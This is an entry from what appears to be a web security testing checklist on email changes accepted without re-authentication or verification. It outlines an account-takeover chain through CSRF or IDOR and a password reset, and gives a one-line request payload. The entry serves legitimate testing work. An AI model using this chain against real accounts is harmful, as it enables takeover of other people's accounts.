**References:** CWE-327; OWASP Cryptographic Failures (A02); WSTG-CRYP

---

## PROF-172 — Email change without re-verification / re-authentication
**Test Category:** Broken Authentication · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Profile email-change endpoint

**Test Steps:** 1. As a logged-in user, change the account email<br>2. Check whether the change takes effect without confirming the NEW email and without re-entering the password<br>3. Combine with a session-riding/CSRF or IDOR to change a victim's email<br>4. Trigger password reset to the attacker email -&gt; ATO

**Expected Result:** Email change requires re-auth + verification of the new address before it becomes effective

**Payload Example:**

```
PUT /api/profile {email: attacker@x}   (no re-auth, no verify)
```

**Impact:** Unverified email change -&gt; attacker-controlled email -&gt; password reset -&gt; account takeover

**Tools:** Burp

**References:** CWE-620; CWE-640; -&gt;[Account Takeover checklist](#/checklist/ato); PortSwigger Authentication; OWASP WSTG-ATHN

---
